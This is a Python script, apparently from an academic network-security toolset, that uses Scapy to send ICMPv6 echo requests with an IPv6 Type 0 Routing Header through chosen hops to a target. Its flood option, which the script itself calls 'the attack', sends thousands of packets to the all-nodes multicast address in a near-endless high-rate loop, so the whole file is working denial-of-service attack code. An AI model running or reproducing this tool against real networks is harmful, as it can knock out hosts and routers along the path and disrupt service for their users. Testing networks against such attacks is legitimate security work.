#! usr/bin/python
import argparse
import sys
import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrRouting, ICMPv6EchoRequest
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast
from scapy.volatile import RandShort
from validate_parameters import is_valid_ipv6
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_num


def main():
    parser = argparse.ArgumentParser(description="Sending PING message(s) with Routing Header to a target, "
                                                 "with option to flood.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination")
    parser.add_argument("-hp", dest="hops", nargs="+", default=[],
                        help="the IPv6 address of intermediate hop(s). Routing Header works when setting the target "
                             "as the last address in list of intermediate hops. (separated by space if more than 1)")
    parser.add_argument("-n", dest="num_packets", action="store", default=1, type=int,
                        help="the number of packets you want to send (set to 1 if skipping)")
    parser.add_argument("-f", dest="flood", action="store_true",
                        help="flood every hop on the way and target")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][0]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> No destination IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the intermediate hops
    if args.hops is None:
        args.hops = []
    if args.hops is not None:
        for i in range(len(args.hops)):
            if not is_valid_ipv6(args.hops[i]):
                print("---> The given IPv6 address of intermediate hop is invalid. Try again!!!")
                sys.exit(1)

    # Validate the number of packets
    if args.num_packets is None:
        args.num_packets = 1
    if args.num_packets is not None:
        if not is_valid_num(args.num_packets):
            print("---> The given number of packets is invalid. Try again!!!")
            sys.exit(1)

    # Generate packet
    layer3 = IPv6(src=args.source_ip, dst=args.destination_ip, hlim=255)
    RH0 = IPv6ExtHdrRouting(addresses=args.hops)
    id = RandShort()

    if not args.flood:
        print("Sending Routing Header message to the destination: ", args.destination_ip)
        for i in range(args.num_packets):
            packet1 = Ether(src=args.source_mac) / layer3 / RH0 / ICMPv6EchoRequest(id=id, seq=i+1, data="VUT FEKT")
            sendp(packet1, verbose=False, iface=args.interface)
    if args.flood:
        pkt_list = []
        print("Flooding the every host on the way and target with Routing Header messages (press Ctrl+C to "
              "stop the attack).....")
        packet1 = Ether(src=args.source_mac, dst="33:33:00:00:00:01") / layer3 / RH0 / ICMPv6EchoRequest(id=id, seq=1, data="VUT FEKT")
        for i in range(5000):
            pkt_list.append(packet1)
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
